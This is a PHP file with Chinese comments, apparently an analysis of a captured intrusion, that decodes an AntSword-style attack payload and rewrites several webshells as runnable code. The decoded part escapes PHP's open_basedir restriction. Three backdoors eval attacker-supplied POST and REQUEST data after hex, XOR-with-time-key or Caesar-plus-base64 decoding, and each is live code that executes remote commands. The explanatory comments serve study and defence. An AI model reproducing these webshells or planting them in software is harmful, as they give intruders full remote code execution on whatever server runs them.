<?php

/** 以下是黑客发送的入侵代码 */
$content = "1=%40ini_set(%22display_errors%22%2C%20%220%22)%3B%40set_time_limit(0)%3B%24opdir%3D%40ini_get(%22open_basedir%22)%3Bif(%24opdir)%20%7B%24ocwd%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3B%24oparr%3Dpreg_split(base64_decode(%22Lzt8Oi8%3D%22)%2C%24opdir)%3B%40array_push(%24oparr%2C%24ocwd%2Csys_get_temp_dir())%3Bforeach(%24oparr%20as%20%24item)%20%7Bif(!%40is_writable(%24item))%7Bcontinue%3B%7D%3B%24tmdir%3D%24item.%22%2F.31eeee%22%3B%40mkdir(%24tmdir)%3Bif(!%40file_exists(%24tmdir))%7Bcontinue%3B%7D%24tmdir%3Drealpath(%24tmdir)%3B%40chdir(%24tmdir)%3B%40ini_set(%22open_basedir%22%2C%20%22..%22)%3B%24cntarr%3D%40preg_split(%22%2F%5C%5C%5C%5C%7C%5C%2F%2F%22%2C%24tmdir)%3Bfor(%24i%3D0%3B%24i%3Csizeof(%24cntarr)%3B%24i%2B%2B)%7B%40chdir(%22..%22)%3B%7D%3B%40ini_set(%22open_basedir%22%2C%22%2F%22)%3B%40rmdir(%24tmdir)%3Bbreak%3B%7D%3B%7D%3B%3Bfunction%20asenc(%24out)%7Breturn%20%24out%3B%7D%3Bfunction%20asoutput()%7B%24output%3Dob_get_contents()%3Bob_end_clean()%3Becho%20%224f%22.%22443%22%3Becho%20%40asenc(";
/** 对接受的函数解码 */
$content = urldecode($content);
parse_str($content, $output);
$_POST = $output;

/** -------------以下是解码后的代码--------------------------------------*/
/** 屏蔽所有错误 */
@ini_set("display_errors", "0");
/** 设置脚本执行永不超时 */
@set_time_limit(0);
/** 获取脚本允许的执行目录 */
$opdir = @ini_get("open_basedir");
if ($opdir) {
    /** 获取当前脚本的目录名称 */
    $ocwd = dirname($_SERVER["SCRIPT_FILENAME"]);
    /** 使用  /;|:/ 分割目录  */
    $oparr = preg_split(base64_decode("Lzt8Oi8="), $opdir);
    /** 将脚本名称，系统执行临时目录添加到oparr目录中 */
    @array_push($oparr, $ocwd, sys_get_temp_dir());
    /** 遍历获取到的所有目录 */
    foreach ($oparr as $item) {
        /** 如果目录没有写的权限则跳过 */
        if (!@is_writable($item)) {
            continue;
        }
        /** 在当前目录下添加一个标记文件 */
        $tmdir = $item . "/.31eeee";
        @mkdir($tmdir);
        /** 添加标记失败跳过 */
        if (!@file_exists($tmdir)) {
            continue;
        }
        /** 获取标记文件真实路径 */
        $tmdir = realpath($tmdir);
        /** 切换到标记文件下作为执行目录 */
        @chdir($tmdir);
        /** 设置php执行目录，这里是设置上级目录作为执行目录，就是获取上级目录的执行权限 */
        @ini_set("open_basedir", "..");
        /** 拆分标记文件目录 */
        $cntarr = @preg_split("/\\\\|\//", $tmdir);
        /** 遍历每一个目录，将目录的上级作为当前执行目录 */
        for ($i = 0; $i < sizeof($cntarr); $i++) {
            @chdir("..");
        }
        /** 将服务器根目录设置为执行目录 */
        @ini_set("open_basedir", "/");
        /** 删除标记文件 */
        @rmdir($tmdir);
        break;
    }
}

/**
 * 应该是混淆函数
 * @param $out
 * @return mixed
 */
function asenc($out)
{
    return $out;
}

/**
 * 获取PHP的缓冲区数据，盗取信息
 * @return void
 */
function asoutput()
{
    $output = ob_get_contents();
    ob_end_clean();
    echo "4f" . "443";
    echo @asenc($output);
}

/**-----------------------------------分割线----------------------------------------*/
/** 伪装的命名空间 */
//namespace app\yonghu\controller;
//hex
/** 获取post参数ant_hex 16进制转字符串 ，屏蔽所有错误 */
$error = null . hexToStr(@$_POST/*\*/ ["ant_hex"]);
/** 将所有post参数 由16进制转字符串 */
foreach ($_POST as $post => $value) {
    $_POST[$post] = hexToStr($value);
}


/** 构建匿名类_ */
class _
{
    /** 设置静态变量 */
    static public $phpcms = Null;

    /**
     * 设置构造函数
     * @param $l
     */
    function __construct($l = "error")
    {
        /** 赋值变量 */
        self::$phpcms = $l;
        /** 加的注释 */
        #@var_dump/*Defining error level offences*/(null.null.self::$phpcms);
        /** 执行接收的变量 */
        @eval/*Defining error level offences*/
        (null . null . self::$phpcms);
    }
}

/** 16进制转字符串 */
function hexToStr($hex)
{
    $str = "";
    /** 两个字节为一个字符位 */
    for ($i = 0; $i < strlen($hex) - 1; $i += 2) {
        /** 获取两个字节，拼接，然后从16进制转10进制 ，然后转asc码 */
        $str .= chr(hexdec($hex[$i] . $hex[$i + 1]));
    }
    /** 返回 */
    return $str;
}

/** 实例化这个匿名对象，执行代码 */
$d = new _($error);
//yuandankuaile
date_default_timezone_set("PRC");
/** 获取当前时间戳 */
$key = md5(date("Y-m-d H:i", time()));

/** 构建test类 */
class TEST
{

    /**
     * 将传输的参数编码，生成需要执行的代码
     * @param string $key 解码的key是当前分钟的秒数
     * @return array|string
     */
    function encode(string $key)
    {
        /** 只解码第一个参数 */
        @$post = base64_decode($_REQUEST['1']);
        /** 对数据进行位运算，组装成可执行的代码 */
        for ($i = 0; $i < strlen($post); $i++) {
            /** 对方的加密代码方式 */
            $post[$i] = $post[$i] ^ $key[$i % 32];
        }

        return $post;
    }

    /**
     * 执行被解码的代码
     * @param $data
     * @return mixed
     */
    function ant($data)
    {
        return eval($this->encode("$data"));
    }
}

/** 实例化test类 */
$test = new TEST;
/** 使用密码解码代码并执行 */
$test->ant($key);
//easy
/**
 * 解码函数
 * @param string $encodedData
 * @return false|string
 */
function decryptPayload(string $encodedData)
{
    /** 首先base64解码 */
    $caesarEncoded = base64_decode($encodedData);
    $caesarDecoded = '';
    /** 将字符串拆分 为单个字符 */
    foreach (str_split($caesarEncoded) as $char) {
        /** 如果字符是字母 */
        if (ctype_alpha($char)) {
            /** 如果检测到时小写字母 */
            $offset = ctype_lower($char) ? 97 : 65;
            $caesarDecoded .= chr((ord($char) - $offset - 3 + 26) % 26 + $offset);
        } else {
            $caesarDecoded .= $char;
        }
    }
    /** 替换字符 */
    $base64Encoded = str_replace("yuandankuaile", "", $caesarDecoded);
    /** 解码 */
    $originalData = base64_decode($base64Encoded);
    return $originalData;
}

/** 解码 */
$encryptedData = isset($_POST['milu']) ? $_POST['milu'] : '';
if (!empty($encryptedData)) {
    $decryptedData = decryptPayload($encryptedData);
    /** 执行 */
    eval($decryptedData);
} else {
    echo "没有接收到数据";
};
